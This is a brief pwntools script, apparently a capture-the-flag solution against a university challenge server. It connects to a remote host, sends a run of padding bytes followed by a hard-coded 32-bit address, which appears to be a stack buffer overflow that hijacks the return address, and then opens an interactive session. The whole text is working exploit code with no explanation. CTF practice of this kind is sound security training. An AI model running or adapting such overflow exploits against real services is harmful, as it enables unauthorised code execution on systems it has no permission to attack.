from pwn import *

s = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 22154)

print(s.recvline())
s.send("A"*0x16)
s.sendline(b'\xf1\x86\x04\x08')

s.interactive()
